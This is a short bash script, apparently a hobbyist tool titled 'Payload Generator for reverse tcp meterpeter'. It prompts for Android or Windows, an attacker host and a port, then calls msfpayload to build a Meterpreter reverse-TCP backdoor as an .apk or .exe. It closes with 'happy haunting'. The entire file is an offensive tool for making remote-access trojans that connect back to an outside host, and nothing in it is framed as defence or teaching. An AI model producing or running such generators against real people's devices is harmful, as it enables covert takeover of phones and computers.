#!/bin/bash
clear
red=$(tput setaf 7)
rst=$(tput sgr0)
echo -e "${red}###### Payload Generator for reverse tcp meterpeter"
echo -e "###### Version 0.3"
echo -e "###### Ymachine ${rst}"
echo -e "Select platform \n1)Android \n2)windows" 
read p

case $p in
	"1") 
		echo "LHOST=";
		read lhost;
		echo "PORT=";
		read port;
		echo "Name of payload::"
		read name;
		msfpayload android/meterpreter/reverse_tcp Lhost=$lhost PORT=$port R>$name.apk;;
	"2") 	
		echo "LHOST=";
		read lhost;
		echo "PORT=";
		read port;
		echo "Name of payload::";
		read name;
		msfpayload windows/meterpreter/reverse_tcp Lhost=$lhost PORT=$port X>$name.exe;;
	
	*) 
		echo "invalid platform"
esac
clear
echo -e "${red}###### Payload Generator for reverse tcp meterpeter"
echo -e "###### Version 0.3"
echo -e "###### Ymachine ${rst}"
echo -e "Your payload is generated \n happy haunting"
